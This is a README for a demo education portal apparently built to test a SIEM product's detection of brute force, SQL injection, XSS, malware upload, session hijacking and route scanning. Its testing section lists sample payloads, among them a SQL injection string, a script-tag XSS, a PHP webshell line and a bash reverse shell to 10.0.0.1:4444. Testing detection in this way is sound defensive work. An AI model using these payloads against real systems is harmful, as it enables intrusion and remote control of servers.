# TechBridge Education Portal — Bloom SIEM Demo Site

A functional education portal with JWT auth, file upload, comments, and course pages — designed for testing Bloom SIEM's malware detection, SQLi/XSS detection, and session hijacking detection.

## Quick Start

### 1. Configure Bloom SIEM

Copy `.env.example` to `.env.local` and fill in your Bloom SIEM credentials:

```bash
cp .env.example .env.local
```

Edit `.env.local`:
```
BLOOM_API_URL=https://your-bloom-instance.space-z.ai
BLOOM_PROJECT_ID=proj_xxx
BLOOM_API_KEY=bloom_xxx
JWT_SECRET=any-random-string-here
ADMIN_USERNAME=admin
ADMIN_PASSWORD=Admin@2025
```

Get these values from your Bloom SIEM dashboard → **Projects** page.

### 2. Install & Run Locally

```bash
npm install
npm run dev
```

Open http://localhost:4000

### 3. Deploy to Vercel

```bash
# Install Vercel CLI
npm install -g vercel

# Login
vercel login

# Deploy
vercel --prod
```

**Important:** Set the environment variables in your Vercel project settings:
- Go to https://vercel.com/dashboard → your project → Settings → Environment Variables
- Add all 5 variables from `.env.example`

## What's Included

### Pages
- `/` — Home page with course listing
- `/login` — Login form (test brute force detection)
- `/signup` — Signup form
- `/dashboard` — Student dashboard (requires auth)
- `/courses` — Course listing
- `/admin` — Admin panel (requires admin auth)

### API Routes
- `/api/login` — Login endpoint (POST)
- `/api/signup` — Signup endpoint (POST)
- `/api/comment` — Comment submission (POST — test XSS detection)
- `/api/upload` — File upload (POST — test malware detection)
- `/api/courses` — Course data
- `/api/search` — Search endpoint
- `/api/admin/audit` — Admin audit log
- `/api/admin/users` — Admin user management

### Bloom SIEM Integration

The middleware (`middleware.ts`) wraps every request:
1. Extracts IP, session (JWT cookie), user-agent, body
2. Calls Bloom `/api/sdk/evaluate` → BLOCK if rule matches
3. Tracks the event to Bloom `/api/sdk/ingest`

**Key fix in this version:** The `sanitizeInput()` function now sends up to **5000 chars** for multipart file uploads (instead of 200), so Bloom's deep malware scanner can inspect the actual file content — not just the multipart headers.

## Testing Bloom SIEM Detection

### Brute Force (T1110)
```
POST /api/login with wrong credentials 6+ times
→ Bloom detects brute force → IP auto-blocked
```

### SQL Injection (T1190)
```
POST /api/login with username: ' OR '1'='1' --
→ Bloom detects SQLi → request denied
```

### XSS (T1059)
```
POST /api/comment with message: <script>alert(1)</script>
→ Bloom detects XSS → request denied
```

### Malware Upload (T1204)
```
POST /api/upload with a file containing:
  - PHP webshell: <?php system($_GET["cmd"]); ?>
  - VBA macro: Sub AutoOpen() ... Shell("cmd")
  - Reverse shell: bash -i >& /dev/tcp/10.0.0.1/4444
→ Bloom deep scanner detects malware → IP blocked + session revoked
```

### Session Hijacking (T1078)
```
Use the same session token from 2 different IPs/countries
→ Bloom detects session replication → session revoked
```

### Route Scanning (T1595)
```
GET /admin, /.env, /.git/config, /wp-admin, /backup.zip
→ Bloom detects route scanning → IP flagged
```

## Attack Simulation

Use the included attack script to simulate all 6 attack types:

```bash
cd scripts
python3 attacks.py https://your-vercel-app.vercel.app all https://your-bloom.space-z.ai proj_xxx bloom_xxx
```

## Tech Stack

- **Next.js 16** with App Router
- **TypeScript**
- **JWT authentication** (jsonwebtoken + bcryptjs)
- **Bloom Security Shield** (middleware-based SDK)
- Deployed on **Vercel**
